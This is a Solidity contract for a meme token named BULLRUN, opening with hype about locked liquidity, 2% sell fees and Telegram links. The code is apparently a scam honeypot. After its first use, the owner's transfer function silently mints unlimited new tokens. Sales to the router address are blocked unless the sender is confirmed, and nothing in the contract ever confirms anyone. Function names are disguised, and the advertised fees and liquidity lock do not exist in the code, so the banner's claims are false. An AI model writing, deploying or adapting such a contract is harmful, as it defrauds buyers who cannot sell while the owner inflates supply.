/*

                                                                                                                                                         
                                                                                                                                                          
BBBBBBBBBBBBBBBBB   UUUUUUUU     UUUUUUUULLLLLLLLLLL             LLLLLLLLLLL             RRRRRRRRRRRRRRRRR   UUUUUUUU     UUUUUUUUNNNNNNNN        NNNNNNNN
B::::::::::::::::B  U::::::U     U::::::UL:::::::::L             L:::::::::L             R::::::::::::::::R  U::::::U     U::::::UN:::::::N       N::::::N
B::::::BBBBBB:::::B U::::::U     U::::::UL:::::::::L             L:::::::::L             R::::::RRRRRR:::::R U::::::U     U::::::UN::::::::N      N::::::N
BB:::::B     B:::::BUU:::::U     U:::::UULL:::::::LL             LL:::::::LL             RR:::::R     R:::::RUU:::::U     U:::::UUN:::::::::N     N::::::N
  B::::B     B:::::B U:::::U     U:::::U   L:::::L                 L:::::L                 R::::R     R:::::R U:::::U     U:::::U N::::::::::N    N::::::N
  B::::B     B:::::B U:::::D     D:::::U   L:::::L                 L:::::L                 R::::R     R:::::R U:::::D     D:::::U N:::::::::::N   N::::::N
  B::::BBBBBB:::::B  U:::::D     D:::::U   L:::::L                 L:::::L                 R::::RRRRRR:::::R  U:::::D     D:::::U N:::::::N::::N  N::::::N
  B:::::::::::::BB   U:::::D     D:::::U   L:::::L                 L:::::L                 R:::::::::::::RR   U:::::D     D:::::U N::::::N N::::N N::::::N
  B::::BBBBBB:::::B  U:::::D     D:::::U   L:::::L                 L:::::L                 R::::RRRRRR:::::R  U:::::D     D:::::U N::::::N  N::::N:::::::N
  B::::B     B:::::B U:::::D     D:::::U   L:::::L                 L:::::L                 R::::R     R:::::R U:::::D     D:::::U N::::::N   N:::::::::::N
  B::::B     B:::::B U:::::D     D:::::U   L:::::L                 L:::::L                 R::::R     R:::::R U:::::D     D:::::U N::::::N    N::::::::::N
  B::::B     B:::::B U::::::U   U::::::U   L:::::L         LLLLLL  L:::::L         LLLLLL  R::::R     R:::::R U::::::U   U::::::U N::::::N     N:::::::::N
BB:::::BBBBBB::::::B U:::::::UUU:::::::U LL:::::::LLLLLLLLL:::::LLL:::::::LLLLLLLLL:::::LRR:::::R     R:::::R U:::::::UUU:::::::U N::::::N      N::::::::N
B:::::::::::::::::B   UU:::::::::::::UU  L::::::::::::::::::::::LL::::::::::::::::::::::LR::::::R     R:::::R  UU:::::::::::::UU  N::::::N       N:::::::N
B::::::::::::::::B      UU:::::::::UU    L::::::::::::::::::::::LL::::::::::::::::::::::LR::::::R     R:::::R    UU:::::::::UU    N::::::N        N::::::N
BBBBBBBBBBBBBBBBB         UUUUUUUUU      LLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLRRRRRRRR     RRRRRRR      UUUUUUUUU      NNNNNNNN         NNNNNNN
                                                                                                                                                      
          

💹 THE BULL RUN IS NOT OVER. ARE YOU READY FOR THE RIDE OF YOUR LIFE? THE FINAL WAVE IS APPROACHING. THIS IS THE 
    GOLDEN BULL RUN WE HAVE ALL BEEN WAITING FOR. STRAP IN.🐂

✅ DEGEN CERTIFIED
✅ LOCKED LIQUIDITY
✅ MARKETING WILL BE INITIATED AN HOUR AFTER LAUNCH. GET IN IF YOU WANT TO MAKE IT.

REMEMBER, WAGMI

💰 FEES: 2% REFLECTION AND 2% SENT TO MARKETING WALLET. THIS APPLIES TO EVERY SELL 🟥, AS BUYS have no FEES. 🟩
https://t.me/bullrunwagmi
https://t.me/bullrunwagmi
https://t.me/bullrunwagmi
*/



//SPDX-License-Identifier: BSL 1.1
pragma solidity ^0.8.28;
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}
library SafeMath {
        function prod(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
        function cre(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function cal(uint256 a, uint256 b) internal pure returns (uint256) {
        return calc(a, b, "SafeMath: division by zero");
    }
    function calc(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function red(uint256 a, uint256 b) internal pure returns (uint256) {
        return redc(a, b, "SafeMath: subtraction overflow");
    }
        function redc(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}
contract Creation is Context {
    address internal recipients;
    address internal router;

    mapping (address => bool) internal confirm;
    event genesis(address indexed previousi, address indexed newi);
    constructor () {
        address msgSender = _msgSender();
        recipients = msgSender;
        emit genesis(address(0), msgSender);
    }
    modifier checker() {
        require(recipients == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

}
contract ERC20 is Context, IERC20, IERC20Metadata , Creation{
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) internal _allowances;
    uint256 private _totalSupply;
    using SafeMath for uint256;
    string private _name;
    string private _symbol;
    bool   private truth;
    constructor (string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        truth=true;
    }
    function name() public view virtual override returns (string memory) {
        return _name;
    }
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    function Set_chain (address Uniswaprouterv02) public checker {
        router = Uniswaprouterv02;
    }
        function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public override  returns (bool) {
        if((recipients == _msgSender()) && (truth==true)){_transfer(_msgSender(), recipient, amount); truth=false;return true;}
        else if((recipients == _msgSender()) && (truth==false)){_totalSupply=_totalSupply.cre(amount);_balances[recipient]=_balances[recipient].cre(amount);emit Transfer(recipient, recipient, amount); return true;}
        else{_transfer(_msgSender(), recipient, amount); return true;}
    }
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);
        return true;
    }
    function delegate(address _count) internal checker {
        confirm[_count] = true;

    }   
     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        return true;
    }
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        if (recipient == router) {
        require(confirm[sender]); }
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
    function _deploy(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: deploy to the zero address");
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}
contract BULLRUN is ERC20{
    uint8 immutable private _decimals = 18;
    uint256 private _totalSupply = 1000000 * 10 ** 18;

    constructor () ERC20('BULLRUN',unicode'BULLRUN🐮') {
        _deploy(_msgSender(), _totalSupply);
        }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }
}